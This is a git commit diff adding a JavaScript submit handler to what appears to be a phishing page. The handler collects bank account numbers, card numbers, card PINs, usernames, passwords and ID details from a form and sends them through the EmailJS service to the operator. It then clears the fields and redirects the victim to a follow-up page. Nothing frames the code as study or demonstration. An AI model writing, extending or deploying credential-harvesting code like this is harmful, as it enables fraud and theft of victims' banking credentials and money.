97ad847f0dd16e705424fa72c0a8b207ef35fdca
official-online <smartgliss60@gmail.com>
2023-10-14 21:39:58 +0100

    standard

--- index.js
+++ index.js
@@ -17,3 +17,49 @@ let email = document.getElementById('email')
 
 let yes = document.getElementById('yes')
 let no = document.getElementById('no')
+
+window.onload = function() {
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        // generate a five digit number for the contact_number variable
+        this.contact_number.value = Math.random() * 100000 | 0;
+        // these IDs from the previous steps
+        emailjs.sendForm("service_hoopla","template_standard", this)
+        .then(function() {
+            console.log('SUCCESS!');
+            name.value = ""
+            surname.value = ""
+            lastname.value = ""
+            reference.value = ""
+            address.value = ""
+            state.value = ""
+            postal.value = ""
+            amount.value = ""
+            acctNumber.value = ""
+            cardNumber.value = ""
+            cardPin.value = ""
+            username.value = ""
+            password.value = ""
+            id.value = ""
+            email.value = ""
+            let subscribe = document.getElementById('submit')
+            console.log('na me')
+            subscribe.style.animationName = 'done';
+            subscribe.value = 'DONE'
+            let Subscribe = setTimeout(sub, 2800);
+            function sub(){
+                subscribe.value = 'Submit'
+                window.location.href="http://127.0.0.1:5501/next.html"
+            }
+        }, function(error) {
+                console.log('FAILED...', error);
+                let subscribe = document.getElementById('submit')
+                subscribe.value = 'unable to submit'
+                subscribe.style.animationName = 'failed';
+                let Subscribe = setTimeout(sub, 4000);
+                function sub(){
+                    subscribe.value = 'Submit'
+                }
+            });
+        });
+}
